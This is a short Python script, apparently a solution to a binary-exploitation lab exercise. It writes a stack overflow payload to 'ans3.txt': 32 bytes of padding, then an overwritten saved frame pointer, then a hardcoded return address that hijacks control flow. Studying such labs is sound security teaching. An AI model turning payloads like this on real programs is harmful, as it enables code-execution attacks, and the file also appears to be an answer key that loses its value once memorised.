import struct
B = 0x7fffffffdc80  
new_rbp = B + 0x100
ret_addr = 0x40122b

payload = b"A" * 32                      
payload += struct.pack("<Q", new_rbp)   
payload += struct.pack("<Q", ret_addr) 

if len(payload) < 64:
    payload += b"B" * (64 - len(payload))

with open("ans3.txt", "wb") as f:
    f.write(payload)

print(f"Payload written to ans3.txt (length: {len(payload)})")
